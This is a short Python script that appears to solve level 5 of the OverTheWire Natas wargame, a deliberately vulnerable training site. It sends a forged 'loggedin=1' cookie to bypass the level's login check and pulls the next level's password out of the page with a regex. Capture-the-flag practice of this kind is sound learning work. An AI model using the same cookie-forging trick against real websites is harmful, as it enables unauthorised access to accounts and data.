import re
import requests


def get_natas6_password(natas5_password):
    URL = "http://natas5.natas.labs.overthewire.org"
    session = requests.Session()
    session.auth = ("natas5", natas5_password)
    cookies = {"loggedin": "1"}

    request = session.get(URL, cookies=cookies)
    natas6_password = re.findall(r"([a-zA-Z\d]{32})", request.text)[1]
    print("[!] The password for Natas 6 is: " + natas6_password)

    return natas6_password


if __name__ == '__main__':
    natas5_password = "" # Put here the password for natas5 here
    get_natas6_password(natas5_password)
